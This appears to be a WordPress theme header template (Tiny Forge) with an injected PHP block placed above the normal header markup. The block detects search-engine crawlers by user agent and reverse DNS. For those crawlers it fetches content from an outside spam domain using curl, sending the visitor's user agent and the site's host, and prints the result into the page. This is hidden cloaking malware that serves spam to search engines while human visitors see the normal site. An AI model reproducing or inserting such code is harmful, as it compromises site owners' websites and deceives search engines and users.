


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://babeswow.pw/cac/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><?php
/**
 * The Header template for our theme
 *
 * Displays all of the <head> section and everything up till <div id="main">
 *
 * @since Tiny Forge 1.0
 */
?><!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) & !(IE 8)]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" />
<meta name="viewport" content="width=device-width" />
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
<?php // Loads HTML5 JavaScript file to add support for HTML5 elements in older IE versions. ?>
<!--[if lt IE 9]>
<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
<![endif]-->
<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>

<?php // Tip04 - Reminder to turn ON JavaScript ?>
<noscript>
	<div id="no-javascript">
		<?php _e( 'Advanced features of this website require that you enable JavaScript in your browser. Thank you!', 'tinyforge' ); ?>
	</div>
</noscript>

<div id="page" class="hfeed site">
	<header id="masthead" class="site-header" role="banner">
		<?php if ( get_theme_mod( 'tinyforge_logo' ) ) : ?>
			<div class="site-branding" itemscope itemtype="http://schema.org/WPHeader">
				<div id="site-logo"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><img src="<?php echo get_theme_mod( 'tinyforge_logo' ); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" id="site-logo-image"></a></div>
				<div id="site-title-wrapper">
					<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
					<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
				</div><!-- #site-title-wrapper -->
			</div>
		<?php else : ?>
			<div class="site-branding" itemscope itemtype="http://schema.org/WPHeader">
				<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
				<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
			</div>
		<?php endif; ?>
		
		<nav id="site-navigation" class="main-navigation" role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement">
			<h1 class="menu-toggle"><?php _e( 'Menu', 'tinyforge' ); ?></h1>
			<a class="assistive-text" href="#content" title="<?php esc_attr_e( 'Skip to content', 'tinyforge' ); ?>"><?php _e( 'Skip to content', 'tinyforge' ); ?></a>
			<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu', 'depth' => 4 ) ); ?>
		</nav><!-- #site-navigation -->

		<?php // Tip06 - Custom headers for posts and pages ?>
		<!-- Custom Header - Start -->
		<?php $header_image = get_header_image();
				if ( function_exists( 'get_custom_header' ) ) {
					/* We need to figure out what the minimum width should be for our featured image
					 * This result would be the suggested width if the theme were to implement flexible widths
					 */
					$header_image_width = get_theme_support( 'custom-header', 'width' );
				}
				?>
			<?php
				/* The header image
				 *
				 * Check if this is a post or page, if it has a thumbnail, and if it's a big one
				 * You can also check if it's not password protected, just add this condition: && ! post_password_required()
				 */
				if ( is_singular() && has_post_thumbnail( $post->ID ) &&
						( /* $src, $width, $height */ $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), array( $header_image_width, $header_image_width ) ) ) &&
						$image[1] >= $header_image_width ) :
					// Houston, we have a new header image!
					echo get_the_post_thumbnail( $post->ID, 'custom-header-image' );
				else :
					if ( function_exists( 'get_custom_header' ) ) {
						$header_image_width  = get_custom_header()->width;
						$header_image_height = get_custom_header()->height;
					}
					?>
				<?php // Check to see if the header image has been removed.
					if ( ! empty( $header_image ) ) : ?>
						<img src="<?php echo esc_url( $header_image ); ?>" class="header-image" width="<?php echo esc_attr( get_custom_header()->width ); ?>" height="<?php echo esc_attr( get_custom_header()->height ); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" />
				<?php endif; // end check for removed header image ?>
			<?php endif; // end check for featured image or standard header ?>
		<!-- Custom Header - End -->

	</header><!-- #masthead -->

	<div id="main" class="wrapper">